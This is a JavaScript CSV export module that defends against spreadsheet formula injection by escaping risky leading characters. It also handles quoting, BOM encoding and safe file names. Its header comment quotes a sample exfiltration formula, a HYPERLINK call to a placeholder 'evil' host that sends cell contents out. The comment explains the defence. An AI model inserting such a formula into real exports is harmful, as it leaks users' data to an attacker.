// CSV writer — PURE (unit-tested).
//
// Formula injection (OWASP "CSV injection"): a cell starting with = + - @ TAB or CR is run as a FORMULA by
// Excel / Google Sheets, e.g. =HYPERLINK("http://evil/?"&A1,"click"). Lead text comes from the internet,
// so every such cell gets a leading apostrophe ' → shown as plain text.
// Also: UTF-8 with BOM (Excel shows Urdu/Arabic correctly), RFC 4180 quoting, CRLF line endings.
const DANGEROUS_START = /^[=+\-@\t\r]/;
const BOM = '﻿';

export function safeCell(value) {
  if (value === null || value === undefined) return '';
  let s;
  if (value instanceof Date) s = Number.isNaN(value.getTime()) ? '' : value.toISOString();
  else if (Array.isArray(value)) s = value.map((v) => (v === null || v === undefined ? '' : String(v))).join('; ');
  else if (typeof value === 'object') s = JSON.stringify(value);
  else s = String(value);
  s = s.replace(/\u0000/g, '');
  // numbers we produce ourselves (e.g. -5 as a real number) are safe; only text is neutralised
  if (typeof value !== 'number' && DANGEROUS_START.test(s)) s = `'${s}`;
  if (/[",\r\n]/.test(s) || /^\s|\s$/.test(s)) s = `"${s.replace(/"/g, '""')}"`;
  return s;
}

/**
 * @param columns [{ key, header }]
 * @param rows    array of plain objects (already mapped to column keys)
 */
export function toCsv(columns, rows) {
  const lines = [columns.map((c) => safeCell(c.header ?? c.key)).join(',')];
  for (const r of rows) lines.push(columns.map((c) => safeCell(r[c.key])).join(','));
  return Buffer.from(`${BOM}${lines.join('\r\n')}\r\n`, 'utf8');
}

/** ASCII-only, no path characters → safe for Content-Disposition. */
export function safeFileName(base, ext) {
  const clean = String(base || 'export').normalize('NFKD').replace(/[^\w.-]+/g, '-').replace(/-+/g, '-').replace(/^[-.]+|[-.]+$/g, '').slice(0, 80) || 'export';
  return `${clean}.${ext}`;
}
